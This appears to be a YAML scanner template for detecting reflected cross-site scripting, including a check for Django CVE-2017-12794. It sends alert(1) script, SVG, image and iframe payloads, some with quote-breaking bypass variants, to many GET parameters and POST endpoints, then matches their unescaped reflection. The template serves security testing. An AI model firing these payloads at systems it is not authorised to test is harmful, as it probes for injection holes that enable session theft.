id: xss-reflected
info:
  name: Reflected Cross-Site Scripting
  severity: High
  description: |
    检测反射型XSS漏洞，通过注入测试payload并检查响应中是否包含未转义的payload。
    覆盖多种注入点、编码方式和上下文。
  tags:
    - xss
    - injection
    - client-side
  reference:
    - https://owasp.org/www-community/attacks/xss/

requests:
  # CVE-2017-12794 Django XSS 特定检测
  # 注意：不能使用 %00 (NUL字符)，因为数据库会拒绝插入包含NUL的字符串
  # 注意：用户名字段限制为 32 字符，payload 必须足够短
  - method: GET
    id: cve-2017-12794
    preconditions:
      methods: [GET]
    path:
      - "{{BaseURL}}/create_user/?username={{payload}}"
    payload_sets:
      demo:
        - "<script>alert(1)</script>"
        - "<svg/onload=alert(1)>"
        - "<img src=x onerror=alert(1)>"
      default:
        - "<script>alert(1)</script>"
        - "<svg/onload=alert(1)>"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
          - "alert(1)"
          - "<svg/onload=alert(1)>"
          - "onerror=alert(1)"
        part: body
        condition: or
    # 排除不适用的绕过技术
    excluded_bypass_techniques:
      - null_byte_injection
      - line_break_injection
      - tab_injection

  - method: GET
    preconditions:
      methods: [GET]
    path:
      - "{{BaseURL}}/?q={{payload}}"
      - "{{BaseURL}}/?search={{payload}}"
      - "{{BaseURL}}/?query={{payload}}"
      - "{{BaseURL}}/?id={{payload}}"
      - "{{BaseURL}}/?name={{payload}}"
      - "{{BaseURL}}/?input={{payload}}"
      - "{{BaseURL}}/?page={{payload}}"
      - "{{BaseURL}}/?url={{payload}}"
      - "{{BaseURL}}/?redirect={{payload}}"
      - "{{BaseURL}}/?next={{payload}}"
      - "{{BaseURL}}/?keyword={{payload}}"
      - "{{BaseURL}}/?user={{payload}}"
      - "{{BaseURL}}/?uid={{payload}}"
      - "{{BaseURL}}/?cat={{payload}}"
      - "{{BaseURL}}/?category={{payload}}"
      - "{{BaseURL}}/?item={{payload}}"
      - "{{BaseURL}}/?msg={{payload}}"
      - "{{BaseURL}}/?message={{payload}}"
      - "{{BaseURL}}/?content={{payload}}"
      - "{{BaseURL}}/?text={{payload}}"
      - "{{BaseURL}}/?value={{payload}}"
      - "{{BaseURL}}/?data={{payload}}"
      - "{{BaseURL}}/?file={{payload}}"
      - "{{BaseURL}}/?path={{payload}}"
      - "{{BaseURL}}/?return={{payload}}"
      - "{{BaseURL}}/?callback={{payload}}"
      - "{{BaseURL}}/?action={{payload}}"
      - "{{BaseURL}}/?username={{payload}}"
    payload_sets:
      default:
        - "<script>alert(1)</script>"
        - "<svg onload=alert(1)>"
        - "<img src=x onerror=alert(1)>"
      aggressive:
        - "<script>alert(1)</script>"
        - "<svg onload=alert(1)>"
        - "<img src=x onerror=alert(1)>"
        - "\"'><script>alert(1)</script>"
        - "javascript:alert(1)"
        - "<body onload=alert(1)>"
        - "<iframe src=javascript:alert(1)>"
        - "<details open ontoggle=alert(1)>"
        - "<audio src=x onerror=alert(1)>"
        - "<video><source onerror=alert(1)>"
        - "<marquee onstart=alert(1)>"
        - "<isindex action=javascript:alert(1)>"
        - "\"><script>alert(1)</script>"
        - "'><script>alert(1)</script>"
        - "</script><script>alert(1)</script>"
      stealthy:
        - "<script>alert(1)</script>"
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "<script[^>]*>"
          - "<svg[^>]*onload\\s*="
          - "<img[^>]*onerror\\s*="
          - ".*?onerror\\s*=\\s*[\"']?alert"
          - ".*?onload\\s*=\\s*[\"']?alert"
          - ".*?ontoggle\\s*="
          - ".*?onstart\\s*="
          - "<iframe"
          - "<body[^>]*onload"
          - "<marquee"
          - "\"'><script"
          - "'><script"
          - "\"><script"
          - "</script><script"
        part: body
        condition: or

  - method: POST
    preconditions:
      methods: [POST]
    path:
      - "{{BaseURL}}/search"
      - "{{BaseURL}}/submit"
      - "{{BaseURL}}/api/search"
      - "{{BaseURL}}/api/query"
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/register"
      - "{{BaseURL}}/contact"
      - "{{BaseURL}}/feedback"
      - "{{BaseURL}}/comment"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: "q={{payload}}&submit=Search"
    payload_sets:
      default:
        - "<script>alert(1)</script>"
        - "<svg onload=alert(1)>"
      aggressive:
        - "<script>alert(1)</script>"
        - "<svg onload=alert(1)>"
        - "<img src=x onerror=alert(1)>"
        - "\"'><script>alert(1)</script>"
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "<script[^>]*>"
          - "<svg[^>]*onload\\s*="
          - "<img[^>]*onerror\\s*="
          - ".*?onerror\\s*=\\s*[\"']?alert"
          - ".*?onload\\s*=\\s*[\"']?alert"
          - "\"'><script"
        part: body
        condition: or

  - method: POST
    preconditions:
      methods: [POST]
    path:
      - "{{BaseURL}}/api/v1/search"
      - "{{BaseURL}}/api/v2/query"
      - "{{BaseURL}}/api/search"
      - "{{BaseURL}}/api/query"
      - "{{BaseURL}}/graphql"
    headers:
      Content-Type: "application/json"
    body: '{"query": "{{payload}}", "limit": 10}'
    payload_sets:
      default:
        - "<script>alert(1)</script>"
        - "<img src=x onerror=alert(1)>"
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "<script[^>]*>"
          - "<img[^>]*onerror\\s*="
          - ".*?onerror\\s*=\\s*[\"']?alert"
        part: body
        condition: or
